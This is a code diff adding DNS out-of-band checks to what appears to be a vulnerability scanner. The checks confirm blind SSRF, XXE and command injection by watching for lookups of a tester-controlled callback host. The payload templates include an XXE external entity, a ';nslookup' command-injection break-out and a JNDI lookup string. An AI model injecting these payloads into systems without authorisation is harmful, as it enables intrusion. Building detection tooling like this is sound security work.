@@ -285,6 +285,54 @@ class OOBCheck:
         return FindingContext.from_oob(hits, bug_class=self.bug_class, expected_token=token)
 
 
+@dataclass(frozen=True)
+class DNSOOBCheck:
+    """DNS out-of-band (blind) check: the sibling of :class:`OOBCheck` for a target whose outbound HTTP is
+    blocked but whose resolver still forwards DNS. Mint a unique token whose callback HOST is
+    ``<token>.<base-domain>``, embed it in a payload that triggers a DNS LOOKUP even when HTTP egress is
+    filtered, inject it, and poll the AUTHORITATIVE DNS collector (``verify.dns_collector.DNSCollector``)
+    for the query the target's resolver forwarded. The proof is the DNS lookup — a strictly weaker but still
+    sound claim than a completed HTTP fetch (resolution reached us; a connection need not have completed).
+
+    ``payload_template`` must contain ``{callback}`` (the bare DNS host — NOT a URL with a scheme, though a
+    payload may wrap it, e.g. ``http://{callback}/``). ``ttl`` (seconds) mints a TTL window retained on the
+    finding context; a lookup observed outside it is refused as EXPIRED/REPLAY on live AND offline re-verify.
+    ``oob`` is a ``DNSCollector`` (its ``register_dns_token`` / ``poll`` surface); an ``OOBReceiver`` also
+    fits (``register_token`` alias), so the same check runs against either collector."""
+
+    id: str
+    bug_class: str
+    payload_template: str = "{callback}"
+    poll_deadline: float = 2.0
+    poll_interval: float = 0.05
+    ttl: float = 300.0
+
+    wants_oob: ClassVar[bool] = True
+
+    def probe(self, template: RequestTemplate, point: InsertionPoint, send: Send, oob) -> "FindingContext | None":
+        register = getattr(oob, "register_dns_token", None) or oob.register_token
+        token, host = register()
+        issued_at = time.time()
+        payload = self.payload_template.format(callback=host)
+        try:
+            send(template.render(point, payload))
+        except Exception:
+            # A blind payload may make the target error its own response; the DNS lookup — not the
+            # response — is the signal, so keep waiting for it.
+            pass
+        deadline = time.monotonic() + self.poll_deadline
+        hits = oob.poll(token)
+        while not hits and time.monotonic() < deadline:
+            time.sleep(self.poll_interval)
+            hits = oob.poll(token)
+        # Retain the registered token AND the mint TTL window so the oracle fires only for a token-matched
+        # lookup observed inside the window (live AND on deterministic offline re-verify).
+        return FindingContext.from_oob(
+            hits, bug_class=self.bug_class, expected_token=token,
+            issued_at=issued_at, expires_at=issued_at + float(self.ttl),
+        )
+
+
 @runtime_checkable
 class RequestCheck(Protocol):
     """A check that operates on the WHOLE request/response — adding a header,
@@ -1098,6 +1146,30 @@ DESERIALIZATION_OOB = OOBCheck(
     id="deserialization-oob", bug_class="deserialization",
     # JNDI/log4shell-style lookup: dereferenced during unsafe deserialization
     payload_template="${{jndi:ldap://{callback}}}",
+)
+
+
+# --- DNS out-of-band (blind) checks: confirmed by the DNS lookup the target's resolver forwards, even
+#     when outbound HTTP is blocked. Each payload triggers a resolution of <token>.<base-domain>.
+DNS_SSRF_OOB = DNSOOBCheck(
+    id="ssrf-dns-oob", bug_class="ssrf",
+    # a server-side fetch resolves the callback host before any (blocked) HTTP connect
+    payload_template="http://{callback}/",
+)
+
+DNS_XXE_OOB = DNSOOBCheck(
+    id="xxe-dns-oob", bug_class="blind_xxe",
+    # external general entity: the parser resolves the SYSTEM host on parse
+    payload_template=(
+        "<?xml version=\"1.0\"?>"
+        "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://{callback}/x\">]><r>&x;</r>"
+    ),
+)
+
+DNS_RCE_OOB = DNSOOBCheck(
+    id="rce-dns-oob", bug_class="command_injection",
+    # a command-injection break-out that forces a DNS lookup (no HTTP needed)
+    payload_template=";nslookup {callback};",
 )
 
 
